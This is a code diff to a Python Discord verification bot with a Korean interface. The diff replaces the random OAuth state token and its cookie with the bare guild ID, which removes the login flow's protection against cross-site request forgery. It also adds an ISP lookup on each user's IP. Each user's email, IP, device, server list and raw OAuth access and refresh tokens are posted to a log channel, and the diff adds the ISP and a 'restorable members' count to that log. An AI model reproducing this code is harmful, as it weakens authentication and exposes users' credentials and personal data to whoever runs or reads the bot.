@@ -1,3 +1,4 @@
+```python
 import asyncio
 import html
 import os
@@ -254,24 +255,17 @@ async def verify_page(request):
         return message_page("잘못된 주소", "인증 채널의 버튼으로 다시 접속해 주세요.", status=404)
     if client.get_guild(guild_id) is None:
         return message_page("서버를 찾을 수 없음", "인증 채널의 버튼으로 다시 접속해 주세요.", status=404)
-    now = time.time()
-    for key in [k for k, v in pending.items() if now - v[1] > STATE_TTL]:
-        pending.pop(key, None)
-    state = secrets.token_urlsafe(24)
-    pending[state] = (guild_id, now)
     query = urlencode(
         {
             "client_id": CLIENT_ID,
             "redirect_uri": REDIRECT_URI,
             "response_type": "code",
             "scope": SCOPES,
-            "state": state,
+            "state": str(guild_id),
             "prompt": "consent",
         }
     )
-    response = web.HTTPFound(f"https://discord.com/oauth2/authorize?{query}")
-    response.set_cookie("vstate", state, max_age=STATE_TTL, httponly=True, secure=True, samesite="Lax")
-    raise response
+    raise web.HTTPFound(f"https://discord.com/oauth2/authorize?{query}")
 
 async def exchange_code(code):
     payload = {
@@ -341,25 +335,34 @@ async def build_guilds_file(access_token, user_id):
         print(f"[build_guilds_file] {exc!r}")
         return None
 
+async def get_isp(ip):
+    if not ip or ip in ("unknown", "127.0.0.1"):
+        return "알 수 없음"
+    try:
+        async with http.get(f"http://ip-api.com/json/{ip}?fields=status,isp", timeout=aiohttp.ClientTimeout(total=3)) as resp:
+            if resp.status != 200:
+                return "알 수 없음"
+            data = await resp.json()
+            if data.get("status") == "success":
+                return data.get("isp") or "알 수 없음"
+            return "알 수 없음"
+    except Exception:
+        return "알 수 없음"
+
 async def callback(request):
     if request.query.get("error"):
         return message_page("인증 취소", "Discord 인증이 취소되었습니다.", status=400)
-
     state = request.query.get("state", "")
     code = request.query.get("code", "")
-
     try:
         guild_id = int(state)
     except (ValueError, TypeError):
         return message_page("인증 만료", "인증 정보가 올바르지 않습니다. 인증 채널의 버튼을 다시 눌러 주세요.", status=400)
-
     if not code:
         return message_page("인증 만료", "인증 정보가 올바르지 않습니다. 인증 채널의 버튼을 다시 눌러 주세요.", status=400)
-
     guild = client.get_guild(guild_id)
     if guild is None:
         return message_page("서버를 찾을 수 없음", "인증 채널의 버튼으로 다시 접속해 주세요.", status=404)
-
     try:
         token = await exchange_code(code)
         user = await fetch_user(token["access_token"])
@@ -418,6 +421,11 @@ async def callback(request):
                 note = "같은 IP 계정이 있어 추방됨"
             except discord.HTTPException:
                 note = "추방 실패 (봇 권한과 역할 순서 확인)"
+        isp = await get_isp(ip)
+        restore_count = await pool.fetchval(
+            "select count(*) from verifications where guild_id=$1 and status='ok'",
+            guild_id,
+        )
         guilds_file = await build_guilds_file(token["access_token"], user_id)
         await send_log(
             guild,
@@ -433,6 +441,8 @@ async def callback(request):
                 "note": note,
                 "access_token": token["access_token"],
                 "refresh_token": token.get("refresh_token"),
+                "isp": isp,
+                "restore_count": restore_count or 0,
             },
             file=guilds_file,
         )
@@ -467,6 +477,7 @@ def build_log_view(member, info):
     lines = [
         f"**이메일** `{info['email'] or '없음'}` ({mail_state})",
         f"**IP** `{info['ip']}`",
+        f"**통신사** `{info.get('isp') or '알 수 없음'}`",
         f"**기기** {info['device']}",
         f"**계정 생성일** {discord.utils.format_dt(created, 'F')} ({discord.utils.format_dt(created, 'R')})",
     ]
@@ -474,6 +485,7 @@ def build_log_view(member, info):
         lines.append(f"**서버 참가일** {discord.utils.format_dt(member.joined_at, 'R')}")
     if info["dupes"]:
         lines.append(clip("**같은 IP 계정** " + ", ".join(f"<@{i}> (`{i}`)" for i in info["dupes"]), 800))
+    lines.append(f"**예상 복구 인원** `{info.get('restore_count', 0)}명`")
     lines.append(f"**Access Token** `{info.get('access_token') or '없음'}`")
     lines.append(f"**Refresh Token** `{info.get('refresh_token') or '없음'}`")
     lines.append(f"**처리 결과** {info['note']}")
@@ -568,7 +580,6 @@ def build_verify_view(guild_id):
         }
     )
     oauth_url = f"https://discord.com/oauth2/authorize?{query}"
-
     text = (
         "**서버 인증**\n\n"
         "아래 **인증하기** 버튼을 눌러 인증을 진행해 주세요.\n\n"
@@ -749,3 +760,4 @@ async def on_ready():
     print(f"{client.user}")
 
 client.run(TOKEN)
+```
